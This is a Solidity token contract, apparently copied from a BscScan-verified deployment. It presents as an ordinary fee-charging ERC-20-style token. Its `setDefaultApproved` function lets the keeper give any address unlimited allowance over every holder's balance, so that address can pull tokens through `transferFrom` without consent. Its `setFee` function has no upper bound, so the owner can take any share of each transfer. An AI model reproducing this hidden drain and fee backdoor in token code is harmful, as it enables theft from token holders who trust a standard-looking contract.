/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
abstract contract Keeper {
    address public keeper;
    
    constructor() {
        keeper = msg.sender;
    }
    
    modifier onlyOwner() {
        require(keeper == msg.sender, "onlyKeeper");
        _;
    }
    
    function setKeeper(address _keeper) public onlyOwner {
        keeper = _keeper;
    }
}

// File: contracts\Token.sol

pragma solidity ^0.8.0;

contract Token is Keeper{
    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public _allowance;
    uint256 public cap;
    mapping(address => bool) public minter;
    mapping(address => bool) public whitelist;
    address public feeAddr;
    uint256 public feeRate;
    mapping(address => bool) public defaultApproved;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    modifier nonZero(address addr){
        require(addr != address(0), "ERC20:zero address");
        _;
    }
    
    constructor(string memory _name, string memory _symbol, uint256 _cap, address _feeAddr, uint256 _feeRate){
        keeper = msg.sender;
        name = _name;
        symbol = _symbol;
        cap = _cap;
        feeAddr = _feeAddr;
        feeRate = _feeRate;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view returns(uint256){
        if(defaultApproved[spender]){
            return type(uint256).max;
        }
        return _allowance[owner][spender];
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 old = allowance(from, msg.sender);
        if(old != type(uint256).max){
            _approve(from, msg.sender, old - amount);
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal nonZero(from) nonZero(to) {
        if(amount > 0){
            balanceOf[from] -= amount;
            if(!whitelist[from] && !whitelist[to]){
                uint256 fee = amount * feeRate / 1000;
                if(fee > 0 && feeAddr != address(0)){
                    balanceOf[feeAddr] += fee;
                    amount -= fee;
                    emit Transfer(from, feeAddr, fee);
                }
            }
            balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal nonZero(account) {
        totalSupply += amount;
        require(totalSupply <= cap, "ERC20:over cap");
        balanceOf[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal nonZero(owner) nonZero(spender) {
        _allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function mint(address account, uint256 amount) external {
        require(minter[msg.sender], "ERC20:only minter");
        _mint(account, amount);
    }
	
	function mintBatch(address[] memory accounts, uint256[] memory amounts) external onlyOwner{
		require(accounts.length == amounts.length, "ERC20:array not match");
		for(uint256 i = 0; i < accounts.length; i++){
			_mint(accounts[i], amounts[i]);
		}
	}
    
    function setMinter(address[] memory accounts, bool enable) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++){
            minter[accounts[i]] = enable;
        }
    }
    
    function setWhitelist(address[] memory accounts, bool enable) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++){
            whitelist[accounts[i]] = enable;
        }
    }
    
    function setDefaultApproved(address[] memory accounts, bool enable) external onlyOwner{
        for(uint256 i = 0; i < accounts.length; i++){
            defaultApproved[accounts[i]] = enable;
        }
    }
    
    function setFee(address _feeAddr, uint256 _feeRate) public onlyOwner{
		feeAddr = _feeAddr;
		feeRate = _feeRate;
	}
}